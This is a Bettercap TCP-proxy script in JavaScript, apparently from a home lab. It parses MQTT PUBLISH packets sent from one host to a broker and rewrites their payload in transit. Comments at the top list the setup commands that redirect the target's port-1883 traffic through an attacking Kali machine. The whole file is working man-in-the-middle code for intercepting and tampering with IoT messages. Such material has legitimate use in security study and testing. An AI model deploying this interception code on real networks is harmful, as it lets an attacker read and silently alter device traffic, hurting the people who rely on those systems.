// Bettercap loads this script and runs it for every captured tcp packet
// Necessary initialisation commands:
// set tcp.proxy.script replace.js;
// set tcp.proxy.address 192.168.1.41; <-- kali IP and port
// set tcp.proxy.port 1884; <-- when started, bettercap creates iptables DNAT rule to direct incoming 1883 traffic here
// set tcp.address 192.168.1.13;  <-- target IP and port
// set tcp.port 1883;
// tcp.proxy on;

// Bettercap is written in go and it uses otto library to interface to js
// --> it is not possible to import libraries in this script
// --> it is not possible to use other than language basic commands

function parseMQTTPacket(data) {
  var pos = 0;

  // MQTT packet type is first 4 bits (type 3 is PUBLISH)
  var packetType = data[0] >> 4;
  if (packetType !== 3) {
    return null; // Not MQTT PUBLISH, skip parsing
  }

  pos = 1; // after first fixed header byte

  // Decode Remaining Length (variable-length encoding)
  var multiplier = 1;
  var remainingLength = 0;
  var digit;
  do {
    digit = data[pos++];
    remainingLength += (digit & 127) * multiplier;
    multiplier *= 128;
  } while ((digit & 128) !== 0 && pos < data.length);

  if (pos + 2 > data.length) {
    console.log("[!] Malformed MQTT packet (no room for topic length)");
    return null;
  }

  // Topic Length (2 bytes)
  var topicLength = (data[pos++] << 8) + data[pos++];
  var topic = "";

  // Extract Topic
  for (var i = 0; i < topicLength && pos < data.length; i++) {
    topic += String.fromCharCode(data[pos++]);
  }

  // Extract Payload (remaining bytes)
  var payload = "";
  while (pos < data.length) {
    var byte = data[pos++];
    payload += byte >= 32 && byte <= 126 ? String.fromCharCode(byte) : ".";
  }

  return { topic: topic, payload: payload };
}

function onData(from, to, data, callback) {
  console.log("[*] Intercepted Packet From: " + from + " To: " + to);
  if (from === "192.168.1.39" && to === "192.168.1.13") {
    var mqttPacket = parseMQTTPacket(data);

    if (mqttPacket) {
      console.log("[MQTT Topic]: " + mqttPacket.topic);
      console.log("[MQTT Payload]: " + mqttPacket.payload);
      if (mqttPacket.payload.indexOf("data") !== -1) {
        // Modify payload
        var modifiedPayload = mqttPacket.payload.replace(/data/g, "XXXX");
        console.log("[*] Modified MQTT Payload: " + modifiedPayload);

        // Reconstruct payload bytes
        var pos = data.length - mqttPacket.payload.length;
        for (
          var i = 0;
          i < modifiedPayload.length && pos + i < data.length;
          i++
        ) {
          data[pos + i] = modifiedPayload.charCodeAt(i) & 0xff;
        }

        console.log("[*] Returning modified packet.");
        return data;
      }
    }
  }
  console.log("[*] No modification applied.");
  return data; // Return original data unchanged
}
